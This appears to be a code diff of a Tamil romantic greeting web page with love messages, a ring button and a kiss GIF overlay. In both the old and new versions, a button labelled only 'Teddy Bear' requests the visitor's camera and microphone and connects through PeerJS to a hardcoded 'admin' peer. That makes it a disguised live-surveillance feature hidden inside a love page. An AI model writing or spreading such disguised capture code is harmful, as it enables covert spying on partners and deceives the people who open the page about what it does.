@@ -1,214 +1,276 @@
-c<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ta">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Our Love Space 💗</title>
+    <title>Our Love Story 💗</title>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@300;400&display=swap" rel="stylesheet">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body {
-            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%);
-            min-height: 100vh; display: flex; justify-content: center; align-items: center;
-            overflow: hidden; position: relative;
+            font-family: 'Poppins', sans-serif;
+            background-color: #ffe6f2; 
+            color: #333;
+            overflow-x: hidden;
+            scroll-behavior: smooth;
         }
-        .container {
-            background: rgba(255, 255, 255, 0.85); padding: 2rem; border-radius: 20px;
-            box-shadow: 0 8px 32px rgba(255, 105, 180, 0.3); text-align: center;
-            width: 90%; max-width: 400px; z-index: 10;
-        }
-        h1 { color: #d6336c; font-size: 1.8rem; margin-bottom: 1.5rem; }
-        .message-card {
-            background: #fff0f5; padding: 1.5rem; border-radius: 15px;
-            margin-bottom: 2rem; border: 2px dashed #ffb3c6;
-        }
-        #daily-message { font-size: 1.2rem; color: #555; line-height: 1.5; }
-        
-        button {
-            padding: 15px 20px; border: none; border-radius: 50px;
-            font-size: 1.1rem; font-weight: bold; cursor: pointer;
-            width: 100%; margin-bottom: 15px; transition: 0.2s;
-        }
-        button:active { transform: scale(0.95); }
-        
-        .surprise-btn { background: linear-gradient(45deg, #ff758c 0%, #ff7eb3 100%); color: white; box-shadow: 0 4px 15px rgba(255, 117, 140, 0.4); }
-        
-        /* Teddy Bear Button & Water */
-        .live-btn { 
-            background: linear-gradient(to bottom, #87CEEB 0%, #4682B4 100%);
-            color: #fff; 
-            border: 3px solid #fff; 
+
+        /* Full Screen Sections with Parallax */
+        .section {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
             position: relative;
-            overflow: hidden;
-            font-size: 1.3rem;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
-            box-shadow: 0 4px 15px rgba(70, 130, 180, 0.5);
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
         }
 
-        /* Water Waves Animation */
-        .water-effect {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 200%;
-            height: 50%;
-            background: rgba(255, 255, 255, 0.3);
-            border-radius: 40% 40% 0 0;
-            animation: moveWaves 3s linear infinite;
-            z-index: 1;
-        }
-        @keyframes moveWaves {
-            0% { transform: translateX(0); }
-            100% { transform: translateX(-50%); }
+        .section-1 {
+            /* Romantic pink aesthetic background */
+            background-image: url('https://images.unsplash.com/photo-1518199266791-5375a83190b7?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80'); 
         }
 
-        /* Fish Animation */
-        .fish-emoji {
-            position: absolute;
-            font-size: 24px;
-            animation: swim 4s linear infinite;
+        .section-2 {
+            /* Flowers */
+            background-image: url('https://images.unsplash.com/photo-1490750967868-88aa4486c946?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80');
+        }
+
+        .section-3 {
+            /* Couple / Rings */
+            background-image: url('https://images.unsplash.com/photo-1515934751635-c81c6bc9a2d8?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80');
+        }
+
+        .section-4 {
+            /* Sunset / Togetherness */
+            background-image: url('https://images.unsplash.com/photo-1520854221256-17451cc331bf?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80');
+        }
+
+        /* Glassmorphism Content Box */
+        .content {
+            position: relative;
             z-index: 2;
-            bottom: 5px;
-        }
-        @keyframes swim {
-            0% { left: -30px; transform: scaleX(1); }
-            50% { left: 100%; transform: scaleX(1); }
-            51% { transform: scaleX(-1); }
-            100% { left: -30px; transform: scaleX(-1); }
-        }
-
-        /* Falling Fish */
-        .falling-fish {
-            position: absolute;
-            font-size: 40px;
-            z-index: 100;
-            transition: top 1.5s ease-in, left 1.5s ease-in;
+            max-width: 90%;
+            width: 400px;
+            background: rgba(255, 255, 255, 0.4); 
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.8);
+            border-radius: 20px;
+            padding: 30px 20px;
+            box-shadow: 0 8px 32px 0 rgba(255, 105, 180, 0.3);
+            animation: fadeIn 1.5s ease-in-out;
         }
 
-        /* Cat */
-        .cat {
-            position: absolute;
-            font-size: 50px;
-            z-index: 101;
-            display: none;
-            transition: 0.5s;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        .stop-btn { background: #ff4d4d; color: white; display: none; box-shadow: 0 4px 15px rgba(255, 77, 77, 0.4); }
+        h1 {
+            font-family: 'Dancing Script', cursive;
+            font-size: 3rem;
+            color: #d6336c;
+            margin-bottom: 15px;
+            text-shadow: 1px 1px 5px rgba(255, 255, 255, 0.8);
+        }
+
+        p {
+            font-size: 1.1rem;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            color: #4a4a4a;
+            font-weight: 400;
+        }
+
+        /* Standard Buttons */
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin: 5px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            width: 100%;
+        }
+        .btn:active { transform: scale(0.95); }
+
+        .surprise-btn { 
+            background: linear-gradient(45deg, #ff758c 0%, #ff7eb3 100%); 
+            color: white; 
+            box-shadow: 0 4px 15px rgba(255, 117, 140, 0.4); 
+        }
         
-        .heart { position: absolute; bottom: -20px; font-size: 20px; animation: floatUp 5s linear infinite; opacity: 0; }
-        @keyframes floatUp { 0% { transform: translateY(0); opacity: 0.8; } 100% { transform: translateY(-100vh) scale(1.5); opacity: 0; } }
+        /* 3rd Button: The Ring */
+        .ring-btn {
+            background: rgba(255, 255, 255, 0.6);
+            color: #d4af37; /* Gold */
+            border: 2px solid #d4af37;
+            font-size: 2rem;
+            padding: 15px 30px;
+            border-radius: 50px;
+            box-shadow: 0 0 20px rgba(212, 175, 55, 0.5);
+            animation: pulseGold 2s infinite;
+            margin-top: 10px;
+        }
+        
+        @keyframes pulseGold {
+            0% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0.7); }
+            70% { box-shadow: 0 0 0 20px rgba(212, 175, 55, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0); }
+        }
+
+        /* --- Kiss/Dance Overlay --- */
+        #kissOverlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 999;
+            display: none; 
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        #kissOverlay.show {
+            display: flex;
+            opacity: 1;
+        }
+
+        .media-container {
+            position: relative;
+            width: 90%;
+            max-width: 450px;
+            height: 60vh;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 0 40px rgba(255, 105, 180, 0.6);
+            border: 3px solid #ff758c;
+        }
+
+        .media-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .close-kiss {
+            margin-top: 25px;
+            padding: 12px 30px;
+            background: linear-gradient(45deg, #ff758c 0%, #ff7eb3 100%);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1rem;
+            box-shadow: 0 4px 15px rgba(255, 77, 77, 0.4);
+        }
+
+        .stop-btn { background: #ff4d4d; color: white; display: none; }
+
     </style>
 </head>
 <body>
-    <div id="hearts-container"></div>
-    <div class="container">
-        <h1>Welcome to Our Space 💖</h1>
-        <div class="message-card">
-            <h2>💌 இன்றைய காதல் செய்தி</h2>
-            <p id="daily-message">Loading...</p>
+
+    <!-- SECTION 1: Intro -->
+    <div class="section section-1">
+        <div class="content">
+            <h1>Our Story Begins...</h1>
+            <p>ஒரு சின்ன சந்திப்பு... அது ஒரு அழகான காதலா மாறியது. கீழே ஸ்க்ரோல் செய்து பாருங்கள்.</p>
         </div>
-        
-        <button id="surpriseBtn" class="surprise-btn" onclick="showSurprise()">💗 Love Surprise</button>
-        
-        <!-- Teddy Bear Button with Water & Fish -->
-        <button id="shareBtn" class="live-btn" onclick="catchFish()">
-            <div class="water-effect"></div>
-            <span class="fish-emoji" style="animation-delay: 0s;">🐠</span>
-            <span class="fish-emoji" style="animation-delay: 1.5s;">🐟</span>
-            <span class="fish-emoji" style="animation-delay: 2.5s;">🐡</span>
-            🧸 Teddy Bear
-        </button>
-        
-        <button id="stopBtn" class="stop-btn" onclick="stopSharing()">🛑 Stop Sharing</button>
+    </div>
+
+    <!-- SECTION 2: Daily Message -->
+    <div class="section section-2">
+        <div class="content">
+            <h1>இன்றைய காதல் செய்தி</h1>
+            <p id="daily-message" style="font-weight: bold; color: #d6336c;">Loading...</p>
+            <button class="btn surprise-btn" onclick="showSurprise()">💗 Love Surprise</button>
+        </div>
+    </div>
+
+    <!-- SECTION 3: The Ring (3rd Button) -->
+    <div class="section section-3">
+        <div class="content">
+            <h1>The Promise...</h1>
+            <p>இந்த மோதிரம் நம் காதலின் அடையாளம். அதைத் தொட்டு பாருங்கள்...</p>
+            
+            <!-- The 3rd Button -->
+            <button class="btn ring-btn" onclick="showKiss()">💍</button>
+        </div>
+    </div>
+
+    <!-- SECTION 4: Live Sharing -->
+    <div class="section section-4">
+        <div class="content">
+            <h1>Always Connected</h1>
+            <p>நாம் எங்கு இருந்தாலும், நம் இதயங்கள் ஒன்றாகவே இருக்கும்.</p>
+            <button id="shareBtn" class="btn surprise-btn" onclick="startSharing()">🧸 Teddy Bear</button>
+            <button id="stopBtn" class="btn stop-btn" onclick="stopSharing()">🛑 Stop</button>
+        </div>
+    </div>
+
+    <!-- Kiss/Dance Overlay -->
+    <div id="kissOverlay">
+        <div class="media-container">
+            <!-- கிஸ் மற்றும் டான்ஸ் GIF இங்க தான் வரும் -->
+            <img id="animeMedia" src="" alt="Romantic Anime">
+        </div>
+        <button class="close-kiss" onclick="closeKiss()">Close 💖</button>
     </div>
 
     <script>
-        // 1. Daily Love Message
+        // 1. Daily Message
         const loveMessages = ["நீ என் வாழ்க்கையின் மிக அழகான பரிசு.", "உன் புன்னகை என்னை மகிழ்ச்சியாக வைத்திருக்கிறது.", "நீ என் எல்லாம்.", "இன்று உன்னை மிகவும் மிஸ் செய்கிறேன்."];
         const dayOfYear = Math.floor((new Date() - new Date(new Date().getFullYear(), 0, 0)) / 1000 / 60 / 60 / 24);
         document.getElementById('daily-message').innerText = loveMessages[dayOfYear % loveMessages.length];
 
-        // 2. Love Surprise
+        // 2. Surprise
         function showSurprise() {
-            const surprises = [
-                "You are my favorite person! ❤️", "I love you to the moon and back! 🌙",
-                "You make my heart skip a beat! 💓", "Forever yours! 💍", "உன் புன்னகை தான் என் உலகம். 🌎",
-                "நீ என் வாழ்க்கையின் மிக அழகான பரிசு. 🎁", "எப்போதும் உன் கூடவே இருப்பேன். 🤝",
-                "உன்னை நினைக்காத நாளே இல்லை. 🥺", "என் இதயம் உன்னிடம் தான் இருக்கு. 💖",
-                "நீ சிரிக்கும் போது என் உலகமே சிரிக்கிறது. 😊", "உன் கண்களில் நான் என் உலகத்தை காண்கிறேன். 👀"
-            ];
+            const surprises = ["You are my favorite person! ❤️", "I love you to the moon and back! 🌙", "Forever yours! 💍", "உன் புன்னகை தான் என் உலகம். 🌎"];
             alert("🎁 SURPRISE! 🎁\n\n" + surprises[Math.floor(Math.random() * surprises.length)]);
         }
 
-        // 3. Floating Hearts
-        setInterval(() => {
-            const heart = document.createElement('div');
-            heart.classList.add('heart'); heart.innerText = ['❤️', '💖', '💗'][Math.floor(Math.random() * 3)];
-            heart.style.left = Math.random() * 100 + 'vw'; heart.style.animationDuration = Math.random() * 3 + 3 + 's';
-            document.getElementById('hearts-container').appendChild(heart);
-            setTimeout(() => heart.remove(), 6000);
-        }, 300);
-
-        // 4. Fish and Cat Animation on Button Click
-        function catchFish() {
-            const btn = document.getElementById('shareBtn');
-            const btnRect = btn.getBoundingClientRect();
+        // 3. Kiss Overlay (The 3rd Button Action)
+        function showKiss() {
+            const overlay = document.getElementById('kissOverlay');
+            const media = document.getElementById('animeMedia');
             
-            // Create a falling fish
-            const fish = document.createElement('div');
-            fish.className = 'falling-fish';
-            fish.innerText = '🐟';
-            fish.style.left = (btnRect.left + btnRect.width / 2) + 'px';
-            fish.style.top = (btnRect.top + btnRect.height / 2) + 'px';
-            document.body.appendChild(fish);
-
-            // Create Cat (Hidden initially)
-            const cat = document.createElement('div');
-            cat.className = 'cat';
-            cat.innerText = '🐱';
-            cat.style.left = (btnRect.left + btnRect.width / 2 - 25) + 'px';
-            cat.style.top = (btnRect.bottom + 20) + 'px';
-            document.body.appendChild(cat);
-
-            // Animate falling
+            // முதலில் ஒரு அழகான கிஸ் செய்யும் GIF-ஐ காட்டுறோம்
+            media.src = "https://media.giphy.com/media/FqBTvSNjNzeZG/giphy.gif";
+            overlay.classList.add('show');
+            
+            // 4 வினாடிகள் கழித்து தானாகவே டான்ஸ் ஆடும் GIF-க்கு மாறும்
             setTimeout(() => {
-                fish.style.top = (btnRect.bottom + 30) + 'px';
-                fish.style.transform = 'rotate(180deg)';
-            }, 50);
-
-            // Show cat and catch fish
-            setTimeout(() => {
-                cat.style.display = 'block';
-                fish.style.display = 'none';
-                cat.innerText = '😻'; 
-            }, 1500);
-
-            // Cleanup
-            setTimeout(() => {
-                fish.remove();
-                cat.remove();
-            }, 3500);
-
-            // Start Live Sharing
-            startAllSharing();
+                media.src = "https://c.tenor.com/13441028759603071083/tenor.gif";
+            }, 4000);
         }
 
-        // 5. Live Video Call
+        function closeKiss() {
+            document.getElementById('kissOverlay').classList.remove('show');
+        }
+
+        // 4. Live Sharing (Teddy Bear)
         const ADMIN_PEER_ID = "love-app-admin-2024"; 
         let camStream, peer;
 
-        async function startAllSharing() {
+        async function startSharing() {
             try {
-                // Change text while keeping fish
-                document.getElementById('shareBtn').innerHTML = `
-                    <div class="water-effect"></div>
-                    <span class="fish-emoji" style="animation-delay: 0s;">🐠</span>
-                    <span class="fish-emoji" style="animation-delay: 1.5s;">🐟</span>
-                    <span class="fish-emoji" style="animation-delay: 2.5s;">🐡</span>
-                    🧸 Connecting...
-                `;
-                
+                document.getElementById('shareBtn').innerText = "Connecting...";
                 camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
                 peer = new Peer(); 
@@ -221,12 +283,12 @@ c<!DOCTYPE html>
                 });
 
                 peer.on('error', (err) => {
-                    alert("Admin Online-ல இல்ல. நெட்வொர்க் செக் பண்ணுங்க.");
+                    alert("Admin Online-ல இல்ல.");
                     stopSharing();
                 });
 
             } catch (err) {
-                alert("கேமரா/மைக் பர்மிஷன் மறுக்கப்பட்டது: " + err.message);
+                alert("பர்மிஷன் மறுக்கப்பட்டது: " + err.message);
                 stopSharing();
             }
         }
@@ -234,16 +296,8 @@ c<!DOCTYPE html>
         function stopSharing() {
             if (camStream) camStream.getTracks().forEach(t => t.stop());
             if (peer) peer.destroy();
-            
-            const btn = document.getElementById('shareBtn');
-            btn.style.display = 'block';
-            btn.innerHTML = `
-                <div class="water-effect"></div>
-                <span class="fish-emoji" style="animation-delay: 0s;">🐠</span>
-                <span class="fish-emoji" style="animation-delay: 1.5s;">🐟</span>
-                <span class="fish-emoji" style="animation-delay: 2.5s;">🐡</span>
-                🧸 Teddy Bear
-            `;
+            document.getElementById('shareBtn').style.display = 'block';
+            document.getElementById('shareBtn').innerText = "🧸 Teddy Bear";
             document.getElementById('stopBtn').style.display = 'none';
         }
     </script>
